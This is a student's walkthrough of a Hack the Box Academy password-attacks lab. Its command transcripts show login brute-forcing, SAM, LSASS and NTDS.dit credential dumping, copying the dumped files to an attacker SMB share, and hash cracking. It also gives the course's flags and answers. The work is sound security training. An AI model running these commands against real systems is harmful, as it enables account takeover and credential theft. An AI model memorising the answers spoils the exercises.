# Password Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Password Attacks
* Tier: I
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: 13-02-2023
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Network Services
### Question 1:
![](./attachments/Pasted%20image%2020230202203530.png)

```
┌──(kali㉿kali)-[~/HTB]
└─$ crackmapexec winrm 10.129.202.136 -u /home/kali/Downloads/Password-Attacks/Password-Attacks/username.list -p /home/kali/Downloads/Password-Attacks/Password-Attacks/password.list 
SMB         10.129.202.136  5985   WINSRV           [*] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.136  5985   WINSRV           [*] http://10.129.202.136:5985/wsman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\admin:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\admin:12345

(...)

WINSRV\john:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:12345
WINRM       10.129.202.136  5985   WINSRV           [-] # Password PoliciesWINSRV\john:123456789
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:batman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:password
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:iloveyou
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:princess
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads]
└─$ evil-winrm -i 10.129.231.100 -u john -p november

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                             

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   8:13 AM             18 flag.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
HTB{That5Novemb3r}
```

**Answer:** `HTB{That5Novemb3r}`

### Question 2:
![](./attachments/Pasted%20image%2020230202203536.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ crackmapexec ssh 10.129.231.100 -u dennis -p password.list 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SSH         10.129.231.100  22     10.129.231.100   [*] SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:123456 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:12345 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:123456789 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:batman Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:password Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:iloveyou Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:princess Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:november Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:1234567 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:12345678 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [+] dennis:rockstar
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ ssh dennis@10.129.231.100
The authenticity of host '10.129.231.100 (10.129.231.100)' can't be established.
ED25519 key fingerprint is SHA256:dRz9BL6NhfzNWUhWdhoTCZB0pFXi+moLOqEj4XlPHOY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.100' (ED25519) to the list of known hosts.
dennis@10.129.231.100's password: 
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
 
dennis@WINSRV C:\Users\dennis>cd Desktop           

dennis@WINSRV C:\Users\dennis\Desktop>dir 
 Volume in drive C has no label.      
 Volume Serial Number is 2683-3D37    
  
 Directory of C:\Users\dennis\Desktop 

01/05/2022  08:16 AM    <DIR>          .
01/05/2022  08:16 AM    <DIR>          ..
01/05/2022  08:39 AM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  26,289,946,624 bytes free

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t}
```

**Answer:** `HTB{Let5R0ck1t}`

### Question 3:
![](./attachments/Pasted%20image%2020230202203546.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ hydra -L mini_usernames.list -P password.list rdp://10.129.231.100
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-02 15:11:57
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 812 login tries (l:4/p:203), ~203 tries per task
[DATA] attacking rdp://10.129.231.100:3389/
[3389][rdp] account on 10.129.231.100 might be valid but account not active for remote desktop: login: cassie password: 12345678910, continuing attacking the account.
[3389][rdp] host: 10.129.231.100   login: chris   password: 789456123
[ERROR] freerdp: The connection failed to establish.
[STATUS] 694.00 tries/min, 694 tries in 00:01h, 118 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-02 15:13:27
```

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/TheLiveEngagement]
└─$ xfreerdp /u:chris /p:'789456123' /v:10.129.231.100
(...)
```

![](./attachments/Pasted%20image%2020230202211513.png)

**Answer:** `HTB{R3m0t3DeskIsw4yT00easy}`

### Question 4:
![](./attachments/Pasted%20image%2020230202203557.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ crackmapexec smb 10.129.231.100 -u cassie -p password.list
SMB         10.129.231.100  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:123456 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:12345 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:123456789 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:batman STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:password STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:iloveyou STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:princess STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:november STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:1234567 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:12345678 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:rockstar STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:abc123 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:nicole STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:daniel STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [+] WINSRV\cassie:12345678910
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ smbclient \\\\10.129.231.100\\CASSIE -U cassie 
Password for [WORKGROUP\cassie]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jan  6 12:48:47 2022
  ..                                 DR        0  Thu Jan  6 12:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 09:44:52 2022
  flag.txt                            A       16  Thu Jan  6 09:46:14 2022

                10328063 blocks of size 4096. 6415514 blocks available
smb: \> get flag.txt
smb: \> !cat flag.txt
HTB{S4ndM4ndB33}
```

**Answer:** `HTB{S4ndM4ndB33}`

---
## Password Mutations
### Question:
![](./attachments/Pasted%20image%2020230204003616.png)

Use `-t 64` to speed things up!

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations]
└─$ hydra -l sam -P mut_password.list ftp://10.129.139.13 -t 64 -V
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 16:54:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 94044 login tries (l:1/p:94044), ~5878 tries per task
[DATA] attacking ftp://10.129.139.13:21/
[ATTEMPT] target 10.129.139.13 - login "sam" - pass "" - 1 of 94044 [child 0] (0/0)
[ATTEMPT] target 10.129.139.13 - login "sam" - pass "!" - 2 of 94044 [child 1] (0/0)
(...)
[ATTEMPT] target 10.129.106.211 - login "sam" - pass "B@tm@n3!" - 17205 of 94063 [child 0] (0/19)
[ATTEMPT] target 10.129.106.211 - login "sam" - pass "b@tm@n4" - 17206 of 94063 [child 30] (0/19)
[21][ftp] host: 10.129.106.211   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 19 final worker threads did not complete until end.
[ERROR] 19 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations]
└─$ ssh sam@10.129.179.127
sam@nix01:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  smb  Templates  
sam@nix01:~$ ls smb
flag.txt
sam@nix01:~$ cat smb/flag.txt
HTB{P455_Mu7ations}
```

**Answer:** `HTB{P455_Mu7ations}`

---
## Password Reuse / Default Passwords
### Question:
![](./attachments/Pasted%20image%2020230204005727.png)

Default credantials found at [github](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)

![](./attachments/Pasted%20image%2020230206103801.png)

**Answer:** `superdba:admin`

---
## Attacking SAM
### Question:
![](./attachments/Pasted%20image%2020230206105734.png)

**Answer:** `hklm\sam`
 
### Question:
![](./attachments/Pasted%20image%2020230206105745.png)
*Hint: Try dumping the hashes from the SAM database.*

RDP into box and run `cmd` as Administrator.

```
Microsoft Windows [Version 10.0.18363.1977]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

We got the registry hivers.

Now let's launch an SMB server on the attack host so we can upload the files to it from the windows host.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now upload the files to the SMB share no the attack host.

```
C:\Windows\system32>cd ..

C:\Windows>cd ..

C:\>move sam.save \\10.10.15.37\CompData
        1 file(s) moved.

C:\>move system.save \\10.10.15.37\CompData
        1 file(s) moved.

C:\>move security.save \\10.10.15.37\CompData
        1 file(s) moved.
```

The files have been uploaded to the attack host.

```
┌──(kali㉿kali)-[~/Documents]
└─$ ls 
sam.save  security.save  system.save
```

Running `secretsdump.py`

```
┌──(kali㉿kali)-[~/Documents]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up...
```

---
EXTRA:
Alternatively `crackmapexec` can be used if we have credentials.

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
---

Copy the hashes to a `.txt` file.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingSAM]
└─$ cat hashes.txt                     
31d6cfe0d16ae931b73c59d7e0c089c0
72639bbb94990305b5a015220f8de34e
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
c02478537b9727d391bc80011c2e2321
58a478135a93ac3bf058a5ea0e8fdb71
```

Run hashcat.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingSAM]
└─$ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

c02478537b9727d391bc80011c2e2321:matrix                   
a3ecf31e65208382e23b3420a34208fc:mommy1                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123
(...)
```

Userrname and paasword for cracked accounts:
`jason:mommy1`
`ITbackdoor:matrix`
`frontdesk:Password123`

**Answer:** `matrix`

### Question:
![](./attachments/Pasted%20image%2020230206105755.png)
*Hint: The credentials can be discovered using 2 different methods shown in the section. Try both.*

Dumping LSA secrets.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingSAM]
└─$ crackmapexec smb 10.129.42.56 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Old configuration file detected, replacing with new version
SMB         10.129.42.56    445    FRONTDESK01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.56    445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.56    445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.42.56    445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a                                                                                                                                        
SMB         10.129.42.56    445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.56    445    FRONTDESK01      frontdesk:Password123
SMB         10.129.42.56    445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/kali/.cme/logs/FRONTDESK01_10.129.42.56_2023-02-06_055632.secrets and /home/kali/.cme/logs/FRONTDESK01_10.129.42.56_2023-02-06_055632.cached
```

**Answer:** `frontdesk:Password123`

---
## Attacking LSASS
### Question:
![](./attachments/Pasted%20image%2020230206122241.png)

![](./attachments/Pasted%20image%2020230206122431.png)

**Answer:** `lsass.exe`

### Question:
![](./attachments/Pasted%20image%2020230206122253.png)

RDP into client, launch the Task Manager, find `Local Security Authority Process`, right click it and select 'Create dump file'.

![](./attachments/Pasted%20image%2020230206122727.png)

Launch a SMB server from the attack host so we can upload the file to it.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Upload the file:

```
C:\>move lsass.DMP \\10.10.15.37\CompData
        1 file(s) moved.
```

We go it.

```
┌──(kali㉿kali)-[~/Documents]
└─$ ls
lsass.DMP
```

Running `pypykatz` to extract credantials.

```
┌──(kali㉿kali)-[~/pypykatz]
└─$ pypykatz lsa minidump /home/kali/Documents/lsass.DMP 
INFO:pypykatz:Parsing file /home/kali/Documents/lsass.DMP
FILE: ======== /home/kali/Documents/lsass.DMP =======
(...)
== LogonSession ==
authentication_id 125774 (1eb4e)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2023-02-06T11:20:26.051689+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 125774
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: NA
        == WDIGEST [1eb4e]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1eb4e]==
                username Vendor
                domainname FS01
                password None
                password (hex)
(...)
```

user:NThash `Vendor:31f87811133bc6aaa75a536e77f64314`

Now run hashcat to crack the hash.

```
┌──(kali㉿kali)-[~/pypykatz]
└─$ sudo hashcat -m 1000 "31f87811133bc6aaa75a536e77f64314" /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

31f87811133bc6aaa75a536e77f64314:Mic@123
```

user:pass `Vendor:Mic@123`

**Answer:** `Mic@123`

---
## Attacking Active Directory & NTDS.dit
### Question:
![](./attachments/Pasted%20image%2020230206193902.png)

Answer is found in section text.

**Answer:** `NTDS.dit`

### Question:
![](./attachments/Pasted%20image%2020230206193911.png)
*Hint: This answer does not require access to the target, only an understanding of NT Hashes.*

```
DjikstraCS@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
(...)
```

NT hash: `64f12cddaa88057e06a81b54e73b949b`

**Answer:** `64f12cddaa88057e06a81b54e73b949b`

### Question:
![](./attachments/Pasted%20image%2020230206193926.png)
*Hint: Consider making a username list and getting on the fasttrack. Also, firstinitiallastname is a popular username convention....*

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingActiveDirectoryNTDS.dit]
└─$ crackmapexec smb 10.129.202.85 -u johnMarston.txt -p /usr/share/wordlists/fasttrack.txt
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\john:Spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\john:Spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\john:Spring2015 STATUS_LOGON_FAILURE
(...)
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local:P@ssword! (Pwn3d!)
```

user:pass `jmarston:P@ssword!`

**Answer:** `jmarston:P@ssword!`

### Question:
![](./attachments/Pasted%20image%2020230206193937.png)
*Hint: Try using both methods for practice.*

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingActiveDirectoryNTDS.dit]
└─$ crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB         10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:88f52503abea1a1c7af66c36b2a9900f:::
SMB         10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/kali/.cme/logs/ILF-DC01_10.129.202.85_2023-02-06_140231.ntds of which 7 were added to the database
```

Jessica Stapleton's NT hash: `92fd67fd2f49d0e83744aa82363f021b`

Let's crack it.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/AttackingActiveDirectoryNTDS.dit]
└─$ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

92fd67fd2f49d0e83744aa82363f021b:Winter2008               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 92fd67fd2f49d0e83744aa82363f021b
Time.Started.....: Mon Feb  6 14:04:21 2023 (1 sec)
Time.Estimated...: Mon Feb  6 14:04:22 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4402.9 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2082816/14344385 (14.52%)
Rejected.........: 0/2082816 (0.00%)
Restore.Point....: 2080768/14344385 (14.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Zmacat05 -> Warsteiner1
Hardware.Mon.#1..: Util: 32%

Started: Mon Feb  6 14:04:20 2023
Stopped: Mon Feb  6 14:04:23 2023
```

user:name `jstapleton:Winter2008`

**Answer:** `Winter2008`

---
## Credential Hunting in Windows
### Question:
![](./attachments/Pasted%20image%2020230206201630.png)

![](./attachments/Pasted%20image%2020230206202810.png)

**Answer:** `WellConnected123`

### Question:
![](./attachments/Pasted%20image%2020230206201637.png)

